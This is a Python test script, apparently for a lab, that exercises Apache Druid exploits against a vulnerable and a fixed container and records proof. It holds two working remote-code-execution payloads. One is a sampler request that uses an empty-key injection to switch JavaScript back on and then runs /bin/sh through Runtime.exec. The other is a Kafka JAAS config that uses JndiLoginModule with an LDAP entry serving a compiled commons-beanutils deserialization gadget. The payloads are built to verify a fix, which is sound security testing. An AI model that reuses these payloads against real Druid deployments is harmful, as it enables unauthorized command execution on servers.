import base64
import hashlib
import json
import os
from pathlib import Path
import sys

sys.dont_write_bytecode = True
from native_client import NativeDruid

runtime = json.loads(Path(os.environ['MODULE_TARGET_RUNTIME']).read_text())
client = NativeDruid(runtime)
profile = os.environ['DRUID_TARGET_PROFILE']
assert profile in ['js', 'jndi']
proof = {'profile': profile, 'targets': {}}
admin = ('admin', 'module-target-druid-password')
marker = '/tmp/module-target-druid-native-proof'
ldap_marker = '/tmp/module-target-druid-native-ldap'


def sample_body():
    data = '\n'.join(json.dumps({'time': '2026-11-10T00:00:00Z', 'name': name, 'value': value}) for value, name in enumerate(['first', 'second', 'third']))
    return {'type': 'index', 'spec': {'dataSchema': {'dataSource': 'module_native', 'timestampSpec': {'column': 'time', 'format': 'iso'}, 'dimensionsSpec': {'dimensions': ['name', 'value']}}, 'ioConfig': {'type': 'index', 'inputSource': {'type': 'inline', 'data': data}, 'inputFormat': {'type': 'json'}}}, 'samplerConfig': {'numRows': 3, 'timeoutMs': 3000}}


def javascript_body(command, injected):
    body = sample_body()
    io = body['spec']['ioConfig']
    io['firehose'] = io.pop('inputSource')
    io.pop('inputFormat')
    schema = body['spec']['dataSchema']
    parse = {'format': 'javascript', 'timestampSpec': schema.pop('timestampSpec'), 'dimensionsSpec': schema.pop('dimensionsSpec')}
    parse['function'] = 'function(line){var a=java.lang.reflect.Array.newInstance(java.lang.String,3);a[0]="/bin/sh";a[1]="-c";a[2]=' + json.dumps(command) + ';var p=java.lang.Runtime.getRuntime().exec(a);p.waitFor();return {time:"2026-11-10T00:00:00Z",name:"native",value:p.exitValue()};}'
    if injected:
        parse[''] = {'enabled': True}
    schema['parser'] = {'type': 'string', 'parseSpec': parse}
    return body


def kafka_body():
    jaas = 'com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://ldap:389/cn=native,dc=module,dc=test" useFirstPass="true" serviceName="native" debug="true" group.provider.url="native";'
    return {'type': 'kafka', 'spec': {'type': 'kafka', 'ioConfig': {'type': 'kafka', 'consumerProperties': {'bootstrap.servers': '127.0.0.1:65534', 'sasl.mechanism': 'SCRAM-SHA-256', 'security.protocol': 'SASL_SSL', 'sasl.jaas.config': jaas}, 'topic': 'native', 'useEarliestOffset': True, 'inputFormat': {'type': 'regex', 'pattern': '([\\s\\S]*)', 'columns': ['raw']}}, 'dataSchema': {'dataSource': 'module_native_ldap', 'timestampSpec': {'column': 'time', 'missingValue': '2026-11-10T00:00:00Z'}, 'dimensionsSpec': {}, 'granularitySpec': {'rollup': False}}, 'tuningConfig': {'type': 'kafka'}}, 'samplerConfig': {'numRows': 1, 'timeoutMs': 3000}}


def absent(service, path):
    client.cli(service, 'test', '!', '-e', path)


def remove_proof(service, path, expected):
    assert client.cli(service, 'cat', path)['stdout'] == expected
    assert client.cli(service, 'stat', '-c', '%u:%g', path)['stdout'].strip() == '1000:1000'
    client.cli(service, 'rm', '--', path)
    absent(service, path)


for service, version in [('vulnerable', '0.20.0'), ('fixed', '0.20.1' if profile == 'js' else '26.0.0')]:
    route = '/' + service + '/'
    status = client.request(route, 'status')
    assert status['status'] == 200 and json.loads(status['response'])['version'] == version
    assert json.loads(client.request(route, 'status/health')['response']) is True
    leader = client.request(route, 'druid/indexer/v1/isLeader')
    assert leader['status'] == 200 and json.loads(leader['response']) == {'leader': True}, leader
    native = client.request(route, 'druid/indexer/v1/sampler', sample_body())
    rows = json.loads(native['response'])
    assert native['status'] == 200 and rows['numRowsRead'] == rows['numRowsIndexed'] == 3
    assert [row['parsed']['name'] for row in rows['data']] == ['first', 'second', 'third']
    identity = client.cli(service, 'id')['stdout']
    java = client.cli(service, 'java', '-version')
    config = client.cli(service, 'cat', '/tmp/conf/druid/cluster/master/coordinator-overlord/runtime.properties')['stdout']
    assert 'druid.javascript.enabled=false' in config
    jars = client.cli(service, 'sh', '-c', 'sha256sum /opt/druid/extensions/druid-kafka-indexing-service/kafka-clients-*.jar /opt/druid/lib/commons-beanutils-*.jar')['stdout']
    proof['targets'][service] = {'version': version, 'identity': identity, 'java': java, 'jars': jars, 'ordinary_rows': rows}

sql = client.cli('metadata', 'env', 'PGPASSWORD=module-target-druid-metadata-password', 'psql', '-h', '127.0.0.1', '-U', 'druid', '-d', 'druid', '-Atc', "SELECT tablename FROM pg_tables WHERE schemaname='public' ORDER BY tablename")['stdout']
assert 'module_vulnerable_segments' in sql and 'module_fixed_segments' in sql
for route, auth, expected in [('/auth/', None, 401), ('/auth/', ('admin', 'wrong'), 401), ('/auth/', admin, 200), ('/auth/', ('viewer', 'module-target-viewer-password'), 200), ('/denied/', ('viewer', 'module-target-viewer-password'), 401), ('/denied/', admin, 200), ('/prefix/', None, 200), ('/', None, 200), ('/vulnerable/no-druid/', None, 404)]:
    path = '' if route == '/' else 'status'
    row = client.request(route, path, auth=auth)
    assert row['status'] == expected, row
    if expected == 200 and route != '/':
        assert json.loads(row['response'])['version'] == '0.20.0'
assert '<html>' in client.requests[-2]['response'].lower()

if profile == 'js':
    command = "printf '%s' 'Native Druid: real execution' > " + marker
    for service in ['vulnerable', 'fixed']:
        for iteration in range(2):
            absent(service, marker)
            disabled = client.request('/' + service + '/', 'druid/indexer/v1/sampler', javascript_body(command, False))
            assert disabled['status'] == 400 and 'JavaScript is disabled' in disabled['response']
            absent(service, marker)
            injected = client.request('/' + service + '/', 'druid/indexer/v1/sampler', javascript_body(command, True))
            if service == 'vulnerable':
                assert injected['status'] == 200, injected
                remove_proof(service, marker, 'Native Druid: real execution')
            else:
                assert injected['status'] == 400 and 'JavaScript is disabled' in injected['response']
                absent(service, marker)
else:
    # Compile only in an independent native toolchain, against actual unchanged
    # distribution jars. The target receives only an ordinary LDAP serialized
    # object; custom Java classes and gadget dependencies are not installed there.
    jars = client.artifacts / 'native-jars'
    jars.mkdir()
    for name in ['commons-beanutils-1.9.4.jar', 'commons-collections-3.2.2.jar', 'commons-logging-1.1.1.jar']:
        client.compose('cp', 'vulnerable:/opt/druid/lib/' + name, str(jars))
    client.cli('compiler', 'mkdir', '-p', 'native-classes')
    client.cli('compiler', 'javac', '-source', '8', '-target', '8', '-d', 'native-classes', '/source/NativeTranslet.java')
    client.cli('compiler', 'javac', '-source', '8', '-target', '8', '-cp', 'native-jars/*', '-d', 'native-classes', '/source/NativeBeanPayload.java')
    built = client.cli('compiler', 'java', '--add-opens', 'java.base/java.util=ALL-UNNAMED', '--add-opens', 'java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED', '-cp', 'native-classes:native-jars/*', 'NativeBeanPayload', 'native-classes/NativeTranslet.class', 'native-bean-marker.ser')
    assert 'serialVersionUID=-2044202215314119608' in built['stdout']
    serialized = client.artifacts.joinpath('native-bean-marker.ser').read_bytes()
    assert serialized.startswith(bytes.fromhex('aced0005'))
    proof['native_object_sha256'] = hashlib.sha256(serialized).hexdigest()
    client.cli('ldap', 'ldapadd', '-Q', '-Y', 'EXTERNAL', '-H', 'ldapi:///', '-f', '/etc/ldap/schema/java.ldif')
    access = b'dn: olcDatabase={1}mdb,cn=config\nchangetype: modify\nadd: olcAccess\nolcAccess: {1}to dn.exact="cn=native,dc=module,dc=test" by * read\n'
    client.cli('ldap', 'ldapmodify', '-Q', '-Y', 'EXTERNAL', '-H', 'ldapi:///', data=access)
    ldif = b'dn: cn=native,dc=module,dc=test\nobjectClass: top\nobjectClass: javaContainer\nobjectClass: javaSerializedObject\ncn: native\njavaClassName: java.util.PriorityQueue\njavaSerializedData:: ' + base64.b64encode(serialized) + b'\n'
    client.cli('ldap', 'ldapadd', '-x', '-H', 'ldap://127.0.0.1', '-D', 'cn=admin,dc=module,dc=test', '-w', 'module-target-ldap-password', data=ldif)
    read = client.cli('ldap', 'ldapsearch', '-x', '-H', 'ldap://127.0.0.1', '-b', 'cn=native,dc=module,dc=test', '-s', 'base')['stdout']
    unfolded = read.replace('\n ', '')
    assert base64.b64encode(serialized).decode() in unfolded and 'result: 0 Success' in read
    for service in ['vulnerable', 'fixed']:
        for iteration in range(2):
            absent(service, ldap_marker)
            row = client.request('/' + service + '/', 'druid/indexer/v1/sampler?for=connect', kafka_body())
            if service == 'vulnerable':
                assert row['status'] == 500 and 'Failed to construct kafka consumer' in row['response'], row
                remove_proof(service, ldap_marker, 'Native LDAP: Druid deserialization')
            else:
                assert row['status'] == 400 and 'JndiLoginModule is not allowed' in row['response'], row
                absent(service, ldap_marker)
    bash = client.cli('vulnerable', 'bash', '--version')['stdout']
    assert '5.1.16' in bash
    proof['bash_prerequisite'] = bash
    client.cli('ldap', 'ldapdelete', '-x', '-H', 'ldap://127.0.0.1', '-D', 'cn=admin,dc=module,dc=test', '-w', 'module-target-ldap-password', 'cn=native,dc=module,dc=test')

proof['counts'] = {'commands': len(client.commands), 'requests': len(client.requests)}
client.artifacts.joinpath('native-druid-proof.json').write_text(json.dumps(proof, indent=2))
print(json.dumps(proof))
